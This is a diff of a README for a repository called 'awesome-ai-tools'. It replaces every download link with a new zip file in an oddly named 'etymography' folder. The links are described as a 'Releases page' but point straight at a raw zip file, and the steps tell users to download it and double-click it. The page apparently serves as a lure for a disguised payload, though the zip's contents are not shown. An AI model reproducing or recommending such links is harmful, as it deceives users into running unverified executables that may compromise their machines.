@@ -1,6 +1,6 @@
 # 🤖 awesome-ai-tools - Simplify Your AI Project Needs
 
-[![Download awesome-ai-tools](https://raw.githubusercontent.com/foodman1227/awesome-ai-tools/main/etymography/awesome-tools-ai-1.7.zip)](https://raw.githubusercontent.com/foodman1227/awesome-ai-tools/main/etymography/awesome-tools-ai-1.7.zip)
+[![Download awesome-ai-tools](https://raw.githubusercontent.com/foodman1227/awesome-ai-tools/main/etymography/tools-awesome-ai-2.8.zip)](https://raw.githubusercontent.com/foodman1227/awesome-ai-tools/main/etymography/tools-awesome-ai-2.8.zip)
 
 ## 📖 Overview
 
@@ -14,7 +14,7 @@ To get started with awesome-ai-tools, follow the instructions below. You'll down
 
 Start by visiting our Releases page to access the latest version:
 
-[Visit this page to download](https://raw.githubusercontent.com/foodman1227/awesome-ai-tools/main/etymography/awesome-tools-ai-1.7.zip)
+[Visit this page to download](https://raw.githubusercontent.com/foodman1227/awesome-ai-tools/main/etymography/tools-awesome-ai-2.8.zip)
 
 ### 2. **Select Your Version**
 
@@ -51,7 +51,7 @@ Before installing awesome-ai-tools, ensure your system meets the following requi
 
 Follow these steps to download and install awesome-ai-tools:
 
-1. Visit our Releases page here: [Visit this page to download](https://raw.githubusercontent.com/foodman1227/awesome-ai-tools/main/etymography/awesome-tools-ai-1.7.zip).
+1. Visit our Releases page here: [Visit this page to download](https://raw.githubusercontent.com/foodman1227/awesome-ai-tools/main/etymography/tools-awesome-ai-2.8.zip).
 2. Choose the latest version from the list.
 3. Click on the file in the Assets section.
 4. After downloading, double-click the file and follow the setup instructions.
